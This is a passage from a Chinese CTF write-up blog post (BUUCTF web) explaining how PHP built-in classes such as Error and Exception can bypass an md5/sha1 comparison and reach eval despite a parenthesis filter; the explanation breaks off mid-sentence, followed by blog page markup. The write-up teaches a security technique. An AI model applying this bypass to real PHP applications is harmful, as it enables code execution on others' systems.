class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>原生类反序列化<br>进入题目，分析源码，题目绕过类型第一眼看上去在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过，但是命令里面eval() syc这个参数有得被执行，所以不能是数组。</p>
<p>所以我们可以使用含有__toString方法的PHP内置类(也就是原生类)来绕过，用的两个比较多的内置类就是Exception和Error，它们之中有一个__toString方法，当类被当作字符串处理时，就会调用这个函数</p>
<p>Error：用于PHP7、8，开启报错<br>Exceotion：用于PHP5、7、8，开启报错<br>Error是所有PHP内部错误类的基类，该类在PHP 7.0.0中开始引入的</p>
<p><img src="/images/C2CD59FD343F419f8C6158AB4F7E32A8.png" srcset="/img/loading.gif" lazyload></p>
<p>发现会以字符串的形式输出当前错误，包含当前的错误信息(payload)以及当前报错的行号(2),而传入Error(‘payload’,1)中的错误代码’1’则没有输出出来，我们再看看两个参数的，怎么绕过MD5以及sha1<br><img src="/images/18C386A2669542c6BC3E6158FF1F4C5F.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li><p>可见，$a和$b这两个对象本身是不同的，但是__toString方法返回的结果是相同的，这里之所以需要在同一行是因为__toString返回的数据包含当前行号</p>
</li>
<li><p>Exception类与Error的使用和结果完全一样，只不过Exception类适用于PHP5和7，而Error只适用于PHP7</p>
</li>
<li><p>我们可以将题目代码中的$syc和$lover分别声明为类似上面的内置类的对象，让这两个对象本身不同(传入的错误代码不同即可)，但是__toString方法输出的结果相同即可</p>
</li>
<li><p>由于题目用preg_match过滤了小括号无法调用函数，所以我们长是直接</p>
</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>buuctf_web</div>
      <div>http://example.com/2023/12/20/buuctf_web/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>奇怪的奇怪</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年12月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/18/sql/" title="sql注入概念理解">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">sql注入概念理解</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/14/sql-labs/" title="sql-labs">
                        <span class="hidden-mobile">sql-labs</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客量 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
